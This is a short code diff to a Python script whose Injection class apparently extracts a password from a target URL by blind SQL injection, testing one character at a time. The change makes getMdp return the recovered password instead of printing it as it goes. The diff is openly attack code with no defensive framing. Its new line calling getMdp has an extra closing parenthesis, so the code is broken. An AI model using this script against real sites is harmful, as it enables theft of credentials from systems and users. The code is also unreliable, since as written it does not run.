@@ -34,7 +34,6 @@ class Injection:
 
         passwd = ''
 
-        print('Password : ', end='')
 
         for index in range(length):
             for char in chars:
@@ -45,15 +44,15 @@ class Injection:
 
                 if not page:
                     passwd += char
-                    print(char, end='')
                     break
 
-            return '\n End !'
+        return passwd
 
 
 def main():
     sqlInjection = Injection(url)
-    print(sqlInjection.getMdp())
+    mdp = sqlInjection.getMdp())
+    print('Password : ', mdp)
 
 
 if __name__ == '__main__':
